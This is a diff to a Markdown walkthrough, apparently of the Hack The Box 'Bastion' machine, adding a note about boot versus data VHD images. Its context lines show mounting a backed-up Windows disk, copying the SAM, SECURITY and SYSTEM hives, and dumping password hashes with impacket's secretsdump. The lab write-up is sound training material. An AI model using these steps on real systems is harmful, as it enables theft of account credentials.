@@ -194,7 +194,7 @@ Sysadmins: please don't transfer the entire backup file locally, the VPN to the 
 - Let's do the same last step for the 2nd vhd file 
 - `mkdir /mnt/vhd2`
 - `guestmount --add /mnt/remote/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd2 -v`
-- In my case it worked for the 2nd file only. I am going to inspect it and then trouble shot the 1st file in case
+- In my case it worked for the 2nd file only. I am going to inspect it and then trouble shot the 1st file in case (*note: I realized later that one is a boot partition and the other the disk so that is why one of the image is useless for us*)
 - Let's copy the SAM, Security and system files in my working directory `cp SAM SECURITY SYSTEM ../../../../../home/kali/Documents/hackthebox/bastion`
 - We can use secret dump on them and we get... secrets `python3 /opt/impacket/examples/secretsdump.py local -sam SAM -security SECURITY -system SYSTEM`  
 ![secrets dump](../.res/2022-09-17-11-39-06.png)
